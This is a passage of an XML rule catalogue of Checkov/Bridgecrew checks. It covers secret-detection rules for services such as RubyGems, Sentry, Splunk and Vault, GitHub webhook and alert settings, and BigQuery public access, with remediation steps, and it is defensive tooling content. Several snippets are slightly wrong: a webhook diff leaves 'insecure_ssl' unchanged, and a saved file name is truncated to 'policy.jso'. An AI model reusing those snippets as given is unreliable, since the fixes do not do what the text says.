+         ViewerProtocolPolicy: 'https-only' # or 'redirect-to-https'

        CacheBehaviors:
          - TargetOriginId: customorigin
                        ...
-           ViewerProtocolPolicy: allow-all
+           ViewerProtocolPolicy: https-only # or redirect-to-https
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/networking_32' target='_blank'> https://docs.bridgecrew.io/docs/networking_32</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/networking_32' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_64</key>
    <name>RubyGems API Key</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="rubygems-api-key"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-ruby-gems-api-key"></div>RubyGems API Key</div><a aria-label="Skip link to RubyGems API Key" class="heading-anchor-icon fa fa-anchor" href="#rubygems-api-key"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>RubyGems is a package manager for the Ruby programming language that provides a standard format for distributing Ruby programs and libraries, a tool designed to easily manage the installation of gems, and a server for distributing them.</p>
<p>You can create multiple API keys based on your requirements. API keys have varying scopes that grant specific privileges. Using API keys with the least amount of privilege makes your RubyGems.org account more secure by limiting the impact a compromised key may have.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---git"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-git"></div>Fix - Git</div><a aria-label="Skip link to Fix - Git" class="heading-anchor-icon fa fa-anchor" href="#fix---git"></a></h1>
<ol>
<li>Visit your RubyGems.org account settings page and click on API KEYS. You will be prompted for your account password to confirm your identity.</li>
<li>Use the Edit button to update the scopes of the key. </li>
<li>You can use the Reset button in the last row to delete all the API keys associated with your account.</li>
</ol> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_64' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_64</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_64' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_65</key>
    <name>Sentry Token</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="sentry-token"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-sentry-token"></div>Sentry Token</div><a aria-label="Skip link to Sentry Token" class="heading-anchor-icon fa fa-anchor" href="#sentry-token"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Sentry Authentication tokens are passed using an auth header, and are used to authenticate as a user or organization account with the API. In our documentation, we have several placeholders that appear between curly braces or chevrons, such as {API_KEY} or &lt;auth_token&gt;, which you will need to replace with one of your authentication tokens in order to use the API call effectively.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---git"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-git"></div>Fix - Git</div><a aria-label="Skip link to Fix - Git" class="heading-anchor-icon fa fa-anchor" href="#fix---git"></a></h1>
<ol>
<li>Go to Settings &gt; Developer Settings &gt; [Your Internal Integration] </li>
<li>You can have up to 20 tokens at a time for each internal integration. These tokens do not expire automatically, but you can manually revoke them as needed.</li>
</ol> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_65' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_65</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_65' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_66</key>
    <name>Splunk User Credentials</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="splunk-user-credentials"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-splunk-user-credentials"></div>Splunk User Credentials</div><a aria-label="Skip link to Splunk User Credentials" class="heading-anchor-icon fa fa-anchor" href="#splunk-user-credentials"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Splunk's Credential Management page enables storing credentials for scripted or modular inputs. Input configurations that reference credentials can use the credentials stored in Credential Management. Developers can store credentials such as usernames and passwords, or certificates used for authentication with third-party systems. It is discouraged to use this page to manage certificates used to encrypt server-to-server communications.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---git"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-git"></div>Fix - Git</div><a aria-label="Skip link to Fix - Git" class="heading-anchor-icon fa fa-anchor" href="#fix---git"></a></h1>
<ol>
<li>On the Enterprise Security menu bar, select Configure &gt; General &gt; Credential Management.</li>
<li>In the Action column of a credential or certificate, click Delete.</li>
<li>Click OK to confirm.</li>
</ol> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_66' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_66</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_66' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_67</key>
    <name>Sumo Logic Keys</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="sumo-logic-keys"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-sumo-logic-keys"></div>Sumo Logic Keys</div><a aria-label="Skip link to Sumo Logic Keys" class="heading-anchor-icon fa fa-anchor" href="#sumo-logic-keys"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>The Sumo Logic Access Keys Management API allows developers to securely register new Collectors or access Sumo Logic APIs. This API was built with OpenAPI. Developers can generate client libraries in many languages and explore automated testing.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---git"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-git"></div>Fix - Git</div><a aria-label="Skip link to Fix - Git" class="heading-anchor-icon fa fa-anchor" href="#fix---git"></a></h1>
<ol>
<li>If you have the Create Access Keys role capability, you can use the Preferences page to create access keys. You can use the Preferences page to edit, activate, deactivate, and delete your access keys. </li>
<li>When you mouse over an access key on the Preferences page, several controls appear.</li>
<li>Use the trash can icon to permanently remove the access key. The key will no longer be usable for API calls. However, deleting a key used to register a Collector does not affect the Collector, as the only time a Collector uses the access key is at installation.</li>
</ol> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_67' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_67</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_67' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_68</key>
    <name>Telegram Bot Token</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="telegram-bot-token"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-telegram-bot-token"></div>Telegram Bot Token</div><a aria-label="Skip link to Telegram Bot Token" class="heading-anchor-icon fa fa-anchor" href="#telegram-bot-token"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>The Telegram Bot API is an HTTP-based interface created for developers keen on building bots for Telegram.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---git"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-git"></div>Fix - Git</div><a aria-label="Skip link to Fix - Git" class="heading-anchor-icon fa fa-anchor" href="#fix---git"></a></h1>
<p>TBD</p> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_68' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_68</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_68' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_71</key>
    <name>Vault Unseal Key</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="vault-unseal-key"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-vault-unseal-key"></div>Vault Unseal Key</div><a aria-label="Skip link to Vault Unseal Key" class="heading-anchor-icon fa fa-anchor" href="#vault-unseal-key"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>When a Vault server is started, it starts in a sealed state. In this state, Vault is configured to know where and how to access the physical storage, but doesn't know how to decrypt any of it. Unsealing is the process of obtaining the plaintext root key necessary to read the decryption key to decrypt the data, allowing access to the Vault.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---git"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-git"></div>Fix - Git</div><a aria-label="Skip link to Fix - Git" class="heading-anchor-icon fa fa-anchor" href="#fix---git"></a></h1>
<p>TBD</p> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_71' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_71</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_71' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_73</key>
    <name>Cloudflare API Credentials</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudflare-api-credentials"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloudflare-api-credentials"></div>Cloudflare API Credentials</div><a aria-label="Skip link to Cloudflare API Credentials" class="heading-anchor-icon fa fa-anchor" href="#cloudflare-api-credentials"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Using the Cloudflare API, requires authentication so that Cloudflare knows who is making requests and what permissions they have. An API Token can be created to grant access to the API to perform actions. See creating an API Token for more on this. When using the Cloudflare API, developers need to authenticate API requests.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---git"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-git"></div>Fix - Git</div><a aria-label="Skip link to Fix - Git" class="heading-anchor-icon fa fa-anchor" href="#fix---git"></a></h1>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Text</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-text theme-light" data-lang="text" name="">curl -X DELETE \

"https://api.cloudflare.com/client/v4/zones/&lt;ZONE_ID&gt;/filters?id=&lt;FILTER_ID_1&gt;&amp;id=&lt;FILTER_ID_2&gt;" \
-H "X-Auth-Email: &lt;EMAIL&gt;" \
-H "X-Auth-Key: &lt;API_KEY&gt;"
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_73' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_73</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_73' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_74</key>
    <name>Vercel API Token</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="vercel-api-token"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-vercel-api-token"></div>Vercel API Token</div><a aria-label="Skip link to Vercel API Token" class="heading-anchor-icon fa fa-anchor" href="#vercel-api-token"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Vercel Access Tokens are required to authenticate and use the Vercel API. Tokens can be created and managed inside your account settings, and can be scoped to only allow access for specific Teams. </p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---git"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-git"></div>Fix - Git</div><a aria-label="Skip link to Fix - Git" class="heading-anchor-icon fa fa-anchor" href="#fix---git"></a></h1>
<p>TBD</p> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_74' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_74</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_74' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_75</key>
    <name>Webflow API Token</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="webflow-api-token"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-webflow-api-token"></div>Webflow API Token</div><a aria-label="Skip link to Webflow API Token" class="heading-anchor-icon fa fa-anchor" href="#webflow-api-token"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Webflow CMS API's allow developers to programmatically add, update, and delete items from Collections. Creating webhooks with the CMS API is gets Webflow to "talk" to third party applications. It lets developers programmatically add, update, and delete items from your Collections.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---git"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-git"></div>Fix - Git</div><a aria-label="Skip link to Fix - Git" class="heading-anchor-icon fa fa-anchor" href="#fix---git"></a></h1>
<p>TBD</p> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_75' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_75</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_75' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_76</key>
    <name>Scalr API Token</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="scalr-api-token"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-scalr-api-token"></div>Scalr API Token</div><a aria-label="Skip link to Scalr API Token" class="heading-anchor-icon fa fa-anchor" href="#scalr-api-token"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Scalr is a remote operations backend for Terraform. It executes Terraform operations and stores state, regardless of the workflow, in Scalr itself allowing for easy collaboration across your organization. That means you can easily onboard an existing GitOps or native Terraform CLI based workflows into Scalr with little to no modification to your actual code.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---git"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-git"></div>Fix - Git</div><a aria-label="Skip link to Fix - Git" class="heading-anchor-icon fa fa-anchor" href="#fix---git"></a></h1>
<p>TBD</p> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_76' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_76</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_76' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GIT_2</key>
    <name>Ensure GitHub repository webhooks use HTTPs</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="github-repository-webhooks-do-not-use-https"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-git-hub-repository-webhooks-do-not-use-htt-ps"></div>GitHub repository webhooks do not use HTTPs</div><a aria-label="Skip link to GitHub repository webhooks do not use HTTPs" class="heading-anchor-icon fa fa-anchor" href="#github-repository-webhooks-do-not-use-https"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Webhooks can be configured to use endpoints of your choosing, including whether TLS is enabled or not. Ensure you are using a webhook endpoint with encryption by using a standard HTTPS URL.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li>Resource: github_repository_webhook</li>
<li>Attribute: insecure_ssl</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "github_repository_webhook" "foo" {
...
  configuration {
-    url          = "http://google.com/"
+    url          = "https://google.com/"
-    insecure_ssl = false
+    insecure_ssl = false
  }

}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-github-organization-and-repository-webhooks-are-using-https' target='_blank'> https://docs.bridgecrew.io/docs/ensure-github-organization-and-repository-webhooks-are-using-https</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-github-organization-and-repository-webhooks-are-using-https' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GIT_3</key>
    <name>Ensure GitHub repository has vulnerability alerts enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="github-repository-doesnt-have-vulnerability-alerts-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-git-hub-repository-doesnt-have-vulnerability-alerts-enabled"></div>GitHub Repository doesn't have vulnerability alerts enabled</div><a aria-label="Skip link to GitHub Repository doesn't have vulnerability alerts enabled" class="heading-anchor-icon fa fa-anchor" href="#github-repository-doesnt-have-vulnerability-alerts-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>GitHub has the ability to scan dependencies for vulnerabilities. To enable this, you must also enable it at the owner level as well. By default, this is enabled for public repos but not for private repos.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li>Resource: github_repository</li>
<li>Attribute: vulnerability_alerts</li>
</ul>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-HCL theme-light" data-lang="HCL" name="">resource "github_repository" "example" {
+  vulnerability_alerts = true
}
</code></pre> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-github-repository-has-vulnerability-alerts-enabled' target='_blank'> https://docs.bridgecrew.io/docs/ensure-github-repository-has-vulnerability-alerts-enabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-github-repository-has-vulnerability-alerts-enabled' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_100</key>
    <name>Ensure GCP BigQuery Tables are not anonymously or publicly accessible</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-bigquery-tables-are-anonymously-or-publicly-accessible"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-big-query-tables-are-anonymously-or-publicly-accessible"></div>GCP BigQuery Tables are anonymously or publicly accessible</div><a aria-label="Skip link to GCP BigQuery Tables are anonymously or publicly accessible" class="heading-anchor-icon fa fa-anchor" href="#gcp-bigquery-tables-are-anonymously-or-publicly-accessible"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>GCP BigQuery tables are the resources in BigQuery that contain your data records, and each BigQuery table belongs to a dataset. Every BigQuery table inherits the IAM policies attached to it's dataset, but each table can also have it's own IAM policies directly applied. These table-level IAM policies can be set for public access via the <strong>allUsers</strong> and <strong>allAuthenticatedUsers</strong> IAM principals which can inadvertently expose your data to the public.</p>
<p>We recommend you ensure anonymous and public access to BigQuery tables is not allowed.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-console"></div>GCP Console</div><a aria-label="Skip link to GCP Console" class="heading-anchor-icon fa fa-anchor" href="#gcp-console"></a></h2>
<p>To change the policy using the GCP Console, follow these steps:</p>
<ol>
<li>Log in to the GCP Console at <a href="https://console.cloud.google.com" target="_self">https://console.cloud.google.com</a>.</li>
<li>Navigate to <a href="https://console.cloud.google.com/bigquery" target="_self">BigQuery</a>.</li>
<li>On the <strong>Dataset Explorer</strong> details page, expand the <em>dataset</em> that contains your <em>table</em>.</li>
<li>Select your target table's kebab menu and then select <strong>open</strong>.</li>
<li>Click the <strong>SHARE</strong> button to open the table's IAM policies.</li>
<li>To remove a specific role assignment, to the front of <strong>allUsers</strong> and <strong>allAuthenticatedUsers</strong>, click <strong>Delete</strong>.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>To remove access to <strong>allUsers</strong> and <strong>allAuthenticatedUsers</strong>, you need to first get the BigQuery tables existing IAM policy. To retrieve the existing policy and copy it to a local file:</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Shell</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-shell theme-light" data-lang="shell" name="">bq get-iam-policy --format=prettyjson \
 PROJECT-ID:DATASET.TABLE \
 &gt; policy.jso
</code></pre></div></div>
<p>Replace <strong>PROJECT-ID</strong> with the project ID where the BigQuery table lives. Replace <strong>DATASET</strong> with the name of the BigQuery dataset that contains the table. Replace <strong>TABLE</strong> with the table name.</p>
<p>Next, locate and remove the IAM bindings with either <strong>allUsers</strong> or <strong>allAuthenticatedUsers</strong> depending on your Checkov error. After modifying the <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">policy.json</code> file, update BigQuery table with the following command:</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Shell</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-shell theme-light" data-lang="shell" name="">bq set-iam-policy \
 PROJECT-ID:DATASET.TABLE \
 policy.json
</code></pre></div></div>
<p>Replace <strong>PROJECT-ID</strong> with the project ID where the BigQuery table lives. Replace <strong>DATASET</strong> with the name of the BigQuery dataset that contains the table. Replace <strong>TABLE</strong> with the table name.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li>
<p><strong>Resource</strong>: google_bigquery_table_iam_member</p>
</li>
<li>
<p><strong>Field</strong>: member</p>
</li>
<li>
<p><strong>Resource</strong>: google_bigquery_table_iam_binding</p>
</li>
<li>
<p><strong>Field</strong>: members</p>
</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">//Option 1
resource "google_bigquery_table_iam_member" "member" {
  dataset_id = google_bigquery_table.default.dataset_id
  table_id = google_bigquery_table.default.table_id
  role = "roles/bigquery.dataOwner"
-  member        = "allUsers"
-  member        = "allAuthenticatedUsers"
}

//Option 2
resource "google_bigquery_table_iam_binding" "binding" {
  dataset_id = google_bigquery_table.default.dataset_id
  table_id = google_bigquery_table.default.table_id
  role = "roles/bigquery.dataOwner"
  members = [
-    "allUsers",
-    "allAuthenticatedUsers"
  ]
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-gcp-bigquery-table-is-not-publicly-accessible' target='_blank'> https://docs.bridgecrew.io/docs/ensure-gcp-bigquery-table-is-not-publicly-accessible</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-gcp-bigquery-table-is-not-publicly-accessible' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_2</key>
    <name>Do not admit privileged containers</name>
